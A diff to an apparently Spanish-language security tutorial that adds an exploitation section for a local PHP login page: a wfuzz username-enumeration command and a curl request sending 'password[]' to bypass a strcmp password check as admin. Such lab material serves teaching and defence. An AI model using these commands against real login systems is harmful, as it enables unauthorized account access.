@@ -760,7 +760,21 @@ Y en ese archivo ponemos el siguiente código:
 
 ### EXPLOTACIÓN
 
+Primero podmeos probar a buscar users y passwords segun la respuesta del servidor con `wfuzz`:
 
+```
+> wfuzz -c --hh=429 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&password=test' http://localhost/login.php
+```
+
+Entonces así nos puede sacar los users, pero no la contraseña, ya que es muy compleja como para poder sacarla mediante fuerza bruta.
+
+Entonces vamos a aprobechar que es código `php` y con `str-recompare` entabla comparativas, pues es una vulnerablilidad critica.
+
+```
+> curl -s -X POST --data 'usuario=admin&password[]=contraseña' http://localhost/login.php
+```
+
+Si no pusiesemos los `corchetes` seria una petición normal mediante `curl` para meter un user y una contraseña, pero ya que sabemos que el user es admin, pero no sabemos la contraseña, podemos usar la vulnerabilidad que hemos visto mediante la cual si ponemos esos corchetes nos logeariamos como ese usuario sin saber la contraseña.
 
 ## PREVENCIÓN
 
